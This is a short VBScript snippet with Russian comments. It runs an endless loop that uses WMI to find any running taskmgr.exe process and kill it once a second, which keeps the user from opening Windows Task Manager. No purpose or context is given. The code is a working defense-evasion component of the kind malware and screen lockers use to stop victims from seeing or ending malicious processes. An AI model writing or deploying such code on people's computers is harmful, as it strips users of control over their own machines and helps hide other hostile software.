Do
    ' Проверяем, есть ли запущенный процесс "taskmgr.exe"
    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='taskmgr.exe'")
    
    ' Если найден запущенный процесс, закрываем его
    If colProcesses.Count > 0 Then
        For Each objProcess In colProcesses
            objProcess.Terminate()  ' Закрыть процесс
        Next
    End If
    
    ' Подождать 1 секунду перед следующей проверкой
    WScript.Sleep(1000)
Loop
